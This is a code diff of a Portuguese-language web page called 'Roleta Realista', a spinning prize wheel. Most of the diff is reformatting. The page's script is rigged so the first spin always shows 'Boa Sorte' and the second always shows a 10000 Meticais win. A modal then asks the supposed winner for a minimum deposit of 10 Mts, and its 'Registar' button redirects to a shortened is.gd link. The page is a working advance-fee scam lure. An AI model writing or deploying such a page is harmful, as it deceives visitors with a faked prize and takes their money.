@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="pt">
+<!DOCTYPE html><html lang="pt">
 <head>
   <meta charset="UTF-8">
   <title>Roleta Realista</title>
@@ -138,62 +137,61 @@
     const somVitoria = document.getElementById('som-vitoria');
     const extraMsg = document.getElementById('msg-extra');
     let tentativas = 0;
-    let anguloAtual = 0;
+    let anguloAtual = 0;setores.forEach((texto, i) => {
+  const div = document.createElement('div');
+  div.classList.add('valor');
+  div.innerText = texto;
+  div.style.setProperty('--angle', `${i * 45}deg`);
+  roleta.appendChild(div);
+});
 
-    setores.forEach((texto, i) => {
-      const div = document.createElement('div');
-      div.classList.add('valor');
-      div.innerText = texto;
-      div.style.setProperty('--angle', `${i * 45}deg`);
-      roleta.appendChild(div);
-    });
+function girarRoleta() {
+  if (tentativas >= 2) return;
 
-    function girarRoleta() {
-      if (tentativas >= 2) return;
+  const giros = 5;
+  let alvo;
 
-      const giros = 5;
-      let alvo;
+  if (tentativas === 0) {
+    alvo = setores.lastIndexOf('Boa Sorte');
+  } else {
+    alvo = setores.findIndex(s => s === '10000 Meticais');
+  }
 
-      if (tentativas === 0) {
-        alvo = setores.lastIndexOf('Boa Sorte');
-      } else {
-        alvo = setores.findIndex(s => s === '10000 Meticais');
-      }
+  const destino = 360 * giros + (360 - alvo * 45);
+  anguloAtual += destino;
+  roleta.style.transform = `rotate(${anguloAtual}deg)`;
 
-      const destino = 360 * giros + (360 - alvo * 45);
-      anguloAtual += destino;
-      roleta.style.transform = `rotate(${anguloAtual}deg)`;
-
-      setTimeout(() => {
-        tentativas++;
-        if (tentativas === 1) {
-          mostrarModal('Resultado: Boa Sorte!', 'Girar Novamente');
-        } else {
-          somVitoria.play();
-          mostrarModal(
-            'Parabéns! Você ganhou 10000 Meticais 🎉',
-            'Registar',
-            'Caro usuário, primeiro faça um depósito mínimo de 10 Mts e aguarde pacientemente.'
-          );
-        }
-      }, 5200);
+  setTimeout(() => {
+    tentativas++;
+    if (tentativas === 1) {
+      mostrarModal('Resultado: Boa Sorte!', 'Girar Novamente');
+    } else {
+      somVitoria.play();
+      mostrarModal(
+        'Parabéns! Você ganhou 10000 Meticais 🎉',
+        'Registar',
+        'Caro usuário, primeiro faça um depósito mínimo de 10 Mts e aguarde pacientemente.'
+      );
     }
+  }, 5200);
+}
 
-    function mostrarModal(msg, botaoTexto, msgExtra = '') {
-      const modal = document.getElementById('modal');
-      const conteudo = document.getElementById('modal-conteudo');
-      conteudo.querySelector('p').innerText = msg;
-      document.getElementById('msg-extra').innerText = msgExtra;
-      const botao = conteudo.querySelector('button');
-      botao.innerText = botaoTexto;
-      botao.onclick = () => {
-        modal.style.display = 'none';
-        if (botaoTexto === 'Registar') {
-          window.location.href = "https://is.gd/hHdRiZ";
-        }
-      };
-      modal.style.display = 'flex';
+function mostrarModal(msg, botaoTexto, msgExtra = '') {
+  const modal = document.getElementById('modal');
+  const conteudo = document.getElementById('modal-conteudo');
+  conteudo.querySelector('p').innerText = msg;
+  document.getElementById('msg-extra').innerText = msgExtra;
+  const botao = conteudo.querySelector('button');
+  botao.innerText = botaoTexto;
+  botao.onclick = () => {
+    modal.style.display = 'none';
+    if (botaoTexto === 'Registar') {
+      window.location.href = "https://is.gd/hHdRiZ";
     }
+  };
+  modal.style.display = 'flex';
+}
+
   </script>
 </body>
-</html>
+  </html>
